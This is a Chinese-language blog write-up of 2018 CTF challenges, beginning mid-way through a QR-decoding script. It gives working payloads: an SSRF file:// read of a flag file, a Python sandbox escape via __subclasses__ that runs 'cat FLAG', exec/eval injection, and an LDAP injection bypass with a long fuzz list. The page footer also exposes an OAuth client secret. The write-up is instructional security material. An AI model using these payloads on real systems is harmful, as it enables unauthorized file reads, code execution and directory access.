class="string">'https://drive.google.com/open?id=1c-go7QIZb_yqGDsRKlXG1j1Py7-wcSFG'</span>: <span class="string">'H'</span>, <span class="string">'https://drive.google.com/open?id=1upmw0QvLjzp6b7RjCrjJGjYfRijF82-g'</span>: <span class="string">'E'</span>, <span class="string">'https://drive.google.com/open?id=1vHlCNodJ84iw51C8gIz4hr0UpsWNx3fm'</span>: <span class="string">'_'</span>, <span class="string">'https://drive.google.com/open?id=1mZivmNZ8uDiUb5YUoF8sj9kZXKkh7GNO'</span>: <span class="string">'W'</span>, <span class="string">'https://drive.google.com/open?id=1pXSHKhMzuKrUMg0x8ygZ36yTn0-9nBe8'</span>: <span class="string">'O'</span>, <span class="string">'https://drive.google.com/open?id=1b5wz-LsIBxnA7mp5ImbNLZQY0nob94OO'</span>: <span class="string">'M'</span>, <span class="string">'https://drive.google.com/open?id=1cZlhiRoZcEiaNEwScBQd0IA2PXh1Z1tX'</span>: <span class="string">'N'</span>, <span class="string">'https://drive.google.com/open?id=1OqacmR-Ccc2YLVYCS2co4dWtSqfEGxIl'</span>: <span class="string">'A'</span>, <span class="string">'https://drive.google.com/open?id=1DF2RneUWAb6wqp7YJ0vjOwDJGdENEc0Q'</span>: <span class="string">'P'</span>, <span class="string">'https://drive.google.com/open?id=1lKeCjQFcTSuUzMGUEeEzPj4d2x1MLTJm'</span>: <span class="string">'R'</span>, <span class="string">'https://drive.google.com/open?id=1JtDxAfX8AEC_mFzJPZofI1RyOL62MAmk'</span>: <span class="string">'D'</span>, <span class="string">'https://drive.google.com/open?id=1hjIQq2fEcduFF0CfRs-MJ2hlCuC5lkW6'</span>: <span class="string">'U'</span>, <span class="string">'https://drive.google.com/open?id=1rHGDe2F5vLws9fA0M3L9IELX9LYaU50x'</span>: <span class="string">'F'</span>, <span class="string">'https://drive.google.com/open?id=1p4m9gtvh31s2SJ9G1uNr8burIvQabm_k'</span>: <span class="string">'?'</span>, <span class="string">'https://drive.google.com/open?id=1g2I1a09lO4m0imhIzJ60LUeDPNDIdIp_'</span>: <span class="string">'Y'</span>, <span class="string">'https://drive.google.com/open?id=1lSanpoEq3LeV0aaL6KEnUiJE2iGijdrt'</span>: <span class="string">'S'</span>, <span class="string">'https://drive.google.com/open?id=1Rw-Op049iTliLPFTTRj7p4gBXmm8IboN'</span>: <span class="string">'I'</span>, <span class="string">'https://drive.google.com/open?id=1H5DHyv0METKfLV7xdzw-SVXU_F1o1iKM'</span>: <span class="string">'L'</span>, <span class="string">'https://drive.google.com/open?id=1GLtL-X1IS4ms6fwC2OQV4jAmXjI_6bjQ'</span>: <span class="string">'C'</span>, <span class="string">'https://drive.google.com/open?id=1vPBtiNzUzYEOEKFK60vG305uPw9CDy8p'</span>: <span class="string">'Q'</span>, <span class="string">'https://drive.google.com/open?id=1DV0ACuyKWsFm2ApXgHHDP_DSzwqmtt5M'</span>: <span class="string">'G'</span>, <span class="string">'https://drive.google.com/open?id=1nlp-HIwnRbG61mf5SF_BzMdlNAR7tHLt'</span>: <span class="string">'Z'</span>, <span class="string">'https://drive.google.com/open?id=151y0xa6hnTR9yp9G0D-dyox08bV4-JZX'</span>: <span class="string">'B'</span>, <span class="string">'https://drive.google.com/open?id=1dtYor_A9Sf3DDTlczTLA0s9rBluVNoOX'</span>: <span class="string">'K'</span>, <span class="string">'https://drive.google.com/open?id=1UpU1_MTK-0XgCpcZKC4AVGsBswNpQTBO'</span>: <span class="string">'X'</span>, <span class="string">'https://drive.google.com/open?id=1apKMrqUwZn5dOkRWfjbYgYH_RvkmPD2P'</span>: <span class="string">'V'</span>, <span class="string">'https://drive.google.com/open?id=1uynnoN7ItBRls7MiqFa1rLE-W3o9CnY5'</span>: <span class="string">'J'</span>&#125;</span><br><span class="line">sum = <span class="number">0</span></span><br><span class="line">code = []</span><br><span class="line">codes = <span class="string">"THE_WOMNAPRDUF?YSILCQGZBKXVJ"</span></span><br><span class="line">string = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ac <span class="keyword">in</span> codes:</span><br><span class="line">    code.append(ac)</span><br><span class="line"><span class="string">'''print (code)'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3490</span>):</span><br><span class="line">    name = <span class="string">"mp4-("</span>+str(i)+<span class="string">").jpg"</span></span><br><span class="line">    decode_result = decode(Image.open(name))</span><br><span class="line">    url = str(decode_result[<span class="number">0</span>].data, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    string = string + pdic[url]</span><br><span class="line">    <span class="keyword">print</span> (string)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if url not in urllist:</span></span><br><span class="line"><span class="string">        picdict[url] = code[sum]</span></span><br><span class="line"><span class="string">        sum = sum + 1    </span></span><br><span class="line"><span class="string">        urllist.append(url)</span></span><br><span class="line"><span class="string">        #print ('[+] '+name+' :'+url)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"><span class="comment">#print ("totla is "+str(sum))</span></span><br><span class="line"><span class="comment">#print (picdict)</span></span><br><span class="line"><span class="keyword">print</span> (string)</span><br></pre></td></tr></table></figure>
<p>以下是看wp后的记录</p>
<h1 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h1><p>I decided to create a tool that searches for<br>hidden elements inside a web pages.<br>Few days ago someone told me that my website is not so /secure/…<br>Can you check it yourself ?</p>
<p><a href="http://13.59.2.198:5588" target="_blank" rel="noopener">http://13.59.2.198:5588</a></p>
<p>解码之后的一段js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var _0x2b80 = [&quot;slow&quot;, &quot;fadeOut&quot;, &quot;#hidden_elements&quot;, &quot;click&quot;, &quot;#hideArea&quot;, &quot;ready&quot;, &quot;fadeIn&quot;, &quot;#showArea&quot;];</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[4])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[1]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">$(document)[_0x2b80[5]](function() &#123;</span><br><span class="line">  $(_0x2b80[7])[_0x2b80[3]](function() &#123;</span><br><span class="line">    $(_0x2b80[2])[_0x2b80[6]](_0x2b80[0]);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>起作用就是创建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;main_form&quot; action=&quot;index.php&quot; style=&quot;position:sticky;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;expression&quot; placeholder=&quot;/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/&quot; type=&quot;text&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>相比之前还要输入一个expression</p>
<p>输入源码里<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden &gt;-_-&lt;/a&gt;&lt;p style=&#39;color:red;&#39;&gt;&lt;/p&gt;</code>中的路径后得到另一段js,不过没用</p>
<p>满足expression的正则，file读取文件</p>
<p><code>?target=file:///var/www/html/flag.txt&amp;expression=/.*/</code></p>
<h1 id="Python-for-fun-Misc"><a href="#Python-for-fun-Misc" class="headerlink" title="Python for fun - Misc"></a>Python for fun - Misc</h1><p><a href="http://chal.noxale.com:8000/" target="_blank" rel="noopener">http://chal.noxale.com:8000/</a></p>
<p>传递两个被解释的参数进行注入</p>
<p><img src="https://i.loli.net/2018/09/09/5b950e343dbf2.png" alt="ks10.png"></p>
<p><code>a,b=print(exec(&quot;import os&quot;),eval(&quot;os.listdir(&#39;.&#39;)&quot;))</code></p>
<p><code>a,b=print(open(&quot;FLAG&quot;, &quot;r&quot;).read())</code></p>
<h3 id="Python-for-fun-2"><a href="#Python-for-fun-2" class="headerlink" title="Python for fun 2"></a>Python for fun 2</h3><p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;cat FLAG&quot;)</code></p>
<h3 id="LDAP-injection"><a href="#LDAP-injection" class="headerlink" title="LDAP injection"></a>LDAP injection</h3><p><a href="http://web.chal.csaw.io:8080/index.php?search=" target="_blank" rel="noopener">http://web.chal.csaw.io:8080/index.php?search=</a></p>
<blockquote>
<p>LDAP注入是一种攻击，用于利用基于web的应用程序，这些应用程序基于用户输入构建LDAP语句。当应用程序无法正确清理用户输入时，可以使用本地代理修改LDAP语句。这可能会导致执行任意命令，例如授予未授权查询的权限，以及在LDAP树内修改内容。SQL注入中可用的相同高级开发技术可以类似地应用于LDAP注入中。</p>
</blockquote>
<p>服务查询类似：<br><code>(&amp;(GivenName=&lt;INPUT&gt;)(!(GivenName=Flag)))</code></p>
<p>利用<code>*)(uid=*))(|(uid=*</code>绕过</p>
<p>完整语句：<br><code>(&amp;(GivenName=*)(uid=*))(|(uid=*)(!(GivenName=Flag)))</code></p>
<p>查询语法：<br><a href="http://www.361way.com/ldap-query-grammar/2542.html" target="_blank" rel="noopener">http://www.361way.com/ldap-query-grammar/2542.html</a></p>
<p>fuzz:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">*)(&amp;</span><br><span class="line">*))%00</span><br><span class="line">*()|%26&apos;</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*)(uid=*))(|(uid=*</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">|</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">admin*)((|userPassword=*)</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">!</span><br><span class="line">%21</span><br><span class="line">%26</span><br><span class="line">%28</span><br><span class="line">%29</span><br><span class="line">%2A%28%7C%28mail%3D%2A%29%29</span><br><span class="line">%2A%28%7C%28objectclass%3D%2A%29%29</span><br><span class="line">%2A%7C</span><br><span class="line">%7C</span><br><span class="line">&amp;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">|</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">*)(uid=*))(|(uid=*</span><br></pre></td></tr></table></figure>
<p>hackitctf</p>
<h1 id="ge-going"><a href="#ge-going" class="headerlink" title="ge  going"></a>ge  going</h1><p><a href="https://ctf.hackit.ua/w31c0m3" target="_blank" rel="noopener">https://ctf.hackit.ua/w31c0m3</a></p>
<p>这是个比较新的隐写思路,相关内容比较少</p>
<blockquote>
<p>零宽度字符是隐藏不显示的，也是不可打印的，也就是说这种字符用大多数程序或编辑器是看不到的。</p>
</blockquote>
<p>相关文章： </p>
<ul>
<li><a href="http://www.freebuf.com/articles/web/167903.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167903.html</a></li>
<li><a href="https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/</a></li>
</ul>
<p>在题目这句<code>W‏‍‏‌‎‎‏‍‏‎‏‏‎‏‎‏‍‌‎‏‏‎‏‍‏‍‌‍‌‍‌‎‏‏‏‍‍‎‏‏‏‌‍‍‌‏‍‏‏‏‍‎‏‏‎‏‌‏‏‏‎‌‏‏‎‏‏‎‍‏‍‌‏‏‎‏‏‌‏‎‏‍‌‌elcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯</code>的W和e之间就隐藏着如下零宽度字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;</span><br></pre></td></tr></table></figure>
<p><code>&amp;zwnj;</code></p>
<blockquote>
<p>它叫零宽不连字，全称是Zero Width Non Joiner，简称&ldquo;ZWNJ&rdquo;，是一个不打印字符，放在电子文本的两个字符之间，抑制本来会发生的连字，而是以这两个字符原本的字形来绘制。Unicode中的零宽不连字字符映射为&ldquo;&rdquo;（zero width non-joiner，U+200C），HTML字符值引用为： &zwnj;</p>
</blockquote>
<p><code>&amp;zwj;</code></p>
<blockquote>
<p>它叫零宽连字，全称是Zero Width Joiner，简称&ldquo;ZWJ&rdquo;，是一个不打印字符，放在某些需要复杂排版语言（如阿拉伯语、印地语）的两个字符之间，使得这两个本不会发生连字的字符产生了连字效果。零宽连字符的Unicode码位是U+200D (HTML: &zwj; &zwj;）。</p>
</blockquote>
<p><code>&amp;lrm;</code> </p>
<blockquote>
<p>左至右符号（Left-to-right mark,LRM）是一种控制字符，或者说是不可见的排版符号。左至右符号的统一码字符是U+200E，亦可在HTML中表现为&lrm; &#x200E;或者&#8206;, UTF-8中则是E2 80 8E。</p>
</blockquote>
<p><code>&amp;rlm;</code></p>
<blockquote>
<p>右至左符号（Right-to-left mark,RLM）是一种控制字符，用于计算机的双向文稿排版中。右至左符号的Unicode字符是U+200F，亦可在HTML中表现为&rlm; &#x200F;或者&#8207;</p>
</blockquote>
<p><code>&amp;#8203;</code></p>
<blockquote>
<p>零宽空格（zero-width space, ZWSP）是一种不可打印的Unicode字符，用于可能需要换行处。在Unicode中，该字符为U+200B“”零宽空格 ，HTML：&#8203;。</p>
</blockquote>
<p>这里的零宽度字符可用<a href="https://github.com/offdev/zwsp-steg-js解密" target="_blank" rel="noopener">https://github.com/offdev/zwsp-steg-js解密</a></p>
<p>de.js内容为</p>
<p><img src="https://i.loli.net/2018/09/11/5b972acc3d0f7.png" alt="ks11.png"></p>
<p>运行获取flag</p>
<p><img src="https://i.loli.net/2018/09/11/5b972b28c31c1.png" alt="ks12.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/09/26/ctfs_18_9/">http://j0k3r.top/2018/09/26/ctfs_18_9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/10/16/Hackergame_2018/"><i class="fa fa-chevron-left">  </i><span>Hackergame 2018 (中国科学技术大学第五届信息安全大赛) WriteUp</span></a></div><div class="next-post pull-right"><a href="/2018/09/02/py-shop/"><span>基于flask/jinja2的简陋的商店系统</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
  id: md5(decodeURI(location.pathname)),
  owner: 'zhuxianjin',
  repo: 'zhuxianjin.github.io',
  oauth: {
    client_id: '7b59169c6ede61f26021',
    client_secret: 'ab44e9406b9214e664d133180ad8e54f696d169d'
  }
})
gitment.render('gitment-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/07/31/5d41a1019cdd085371.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"katou_01"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>